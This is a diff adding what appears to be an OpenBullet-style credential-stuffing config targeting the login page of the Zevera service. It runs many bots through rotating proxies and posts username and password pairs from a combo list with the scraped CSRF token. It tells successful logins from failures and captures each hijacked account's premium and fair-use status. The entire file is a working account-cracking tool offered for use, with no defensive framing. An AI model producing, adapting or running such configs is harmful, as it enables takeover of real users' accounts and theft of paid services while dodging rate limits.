@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "Zevera",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-19T18:28:20.8941112+02:00",
+  "AdditionalInfo": "",
+  "Author": "Aruz",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 3,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.zevera.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"_token\" value=\"" "\"/>" -> VAR "Token" 
+
+REQUEST POST "https://www.zevera.com/login" 
+  CONTENT "_token=<Token>&email=<USER>&password=<PASS>&action=login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY " alert alert-danger" 
+  KEYCHAIN Success OR 
+    KEY "Log out" 
+
+PARSE "<SOURCE>" LR "<h3>Premium Status</h3>" "</p>" -> VAR "Premium Status" 
+
+FUNCTION Replace "<p>" "" "<Premium Status>" -> CAP "Premium Status" 
+
+PARSE "<SOURCE>" LR "Fair-Use Status</h3>" "</p>" -> CAP "Fair-Use Status" 
+
+FUNCTION Replace "<p>" "" "<Fair-Use Status>" -> CAP "Fair-Use Status" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Premium Status>" Contains "inactive" 
+
